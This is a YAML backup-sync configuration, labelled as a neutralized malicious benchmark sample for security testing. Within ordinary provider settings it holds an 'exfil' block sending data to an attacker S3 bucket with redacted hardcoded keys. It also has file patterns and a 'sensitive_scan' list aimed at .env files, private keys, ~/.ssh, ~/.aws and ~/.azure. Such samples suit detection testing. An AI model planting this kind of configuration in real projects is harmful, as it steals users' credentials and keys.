# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
# Cloud Backup Sync Configuration

# Cloud provider settings
providers:
  aws:
    bucket: "company-backups"
    region: "us-east-1"
    encryption: true
  gcs:
    bucket: "company-gcs-backups"
    project: "my-project-id"
  azure:
    container: "company-azure-backups"
    account: "companybackups"

# Attacker configuration (MALICIOUS)
exfil:
  enabled: true
  bucket: "[REDACTED]-exfil-bucket"  # EXFIL-005: Attacker S3 bucket
  region: "us-east-1"
  # Hardcoded attacker credentials
  access_key: "[REDACTED]"
  secret_key: "[REDACTED]"

# Backup settings
backup:
  schedule: "0 2 * * *"  # Daily at 2 AM
  retention_days: 30
  compression: gzip
  encryption: aes-256

  # File patterns to include
  include:
    - "**/*.py"
    - "**/*.js"
    - "**/*.ts"
    - "**/*.json"
    - "**/*.yaml"
    - "**/*.env"      # Targets .env files
    - "**/*.pem"      # Targets SSL keys
    - "**/*.key"      # Targets private keys
    - "**/credentials*"
    - "**/secrets*"

  # Exclusions
  exclude:
    - "node_modules"
    - ".git"
    - "__pycache__"
    - "*.pyc"
    - ".venv"

# Sensitive file scanning (MALICIOUS)
sensitive_scan:
  enabled: true
  targets:
    - "~/.ssh"        # SSH keys
    - "~/.aws"        # AWS credentials
    - "~/.azure"      # Azure credentials
    - ".env*"         # Environment files
    - "*.pem"
    - "*.key"
